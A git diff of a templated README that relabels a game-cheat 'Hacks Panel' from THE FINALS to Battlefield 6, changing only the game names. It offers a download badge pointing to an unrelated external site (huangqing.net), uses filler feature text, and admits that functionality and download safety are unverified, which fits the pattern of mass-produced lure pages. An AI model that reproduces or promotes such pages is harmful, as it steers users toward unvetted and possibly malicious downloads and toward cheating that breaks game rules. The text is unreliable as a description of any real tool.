@@ -1,12 +1,12 @@
-# 🎮 Hacks Panel for THE FINALS — Download & Features
+# 🎮 Hacks Panel for Battlefield 6 — Download & Features
 
-**Hacks Panel for THE FINALS** is an unofficial third-party gaming utility concept featuring customizable settings, gameplay-related controls, and various configuration options for THE FINALS.
+**Hacks Panel for Battlefield 6** is an unofficial third-party gaming utility concept featuring customizable settings, gameplay-related controls, and various configuration options for Battlefield 6.
 
-Explore advertised panel features, adjustable preferences, and interface customization options associated with Embark Studios' fast-paced multiplayer shooter THE FINALS. Actual functionality has not been verified.
+Explore advertised panel features, adjustable preferences, and interface customization options associated with Electronic Arts' large-scale multiplayer first-person shooter Battlefield 6. Actual functionality has not been verified.
 
-## 📥 Download Hacks Panel for THE FINALS
+## 📥 Download Hacks Panel for Battlefield 6
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-HACKS_PANEL_FOR_THE_FINALS-00C853?style=for-the-badge&logo=github&logoColor=white)](https://huangqing.net/s/file)
+[![Download](https://img.shields.io/badge/DOWNLOAD-HACKS_PANEL_FOR_BATTLEFIELD_6-00C853?style=for-the-badge&logo=github&logoColor=white)](https://huangqing.net/s/file)
 
 ## ✨ Features & Options
 
@@ -26,7 +26,7 @@ Third-party hacks panels may advertise features such as:
 ## 🔥 Highlights
 
 - ⚡ Customizable configuration categories
-- 🎮 THE FINALS-related utility concept
+- 🎮 Battlefield 6-related utility concept
 - 🎨 Adjustable interface preferences
 - 🛠️ Organized settings panel
 - 🚀 Simple navigation and configuration options
@@ -34,8 +34,8 @@ Third-party hacks panels may advertise features such as:
 
 ## ⚠️ Disclaimer
 
-This is an unofficial third-party tool. Its functionality and download safety have not been verified. Unauthorized modifications may violate THE FINALS rules and result in account restrictions or permanent bans.
+This is an unofficial third-party tool. Its functionality and download safety have not been verified. Unauthorized modifications may violate Battlefield 6 rules and result in account restrictions or permanent bans.
 
 ---
 
-⭐ **THE FINALS Hacks Panel | THE FINALS Gaming Utility | Custom Settings | Download**
+⭐ **Battlefield 6 Hacks Panel | BF6 Gaming Utility | Custom Settings | Download**
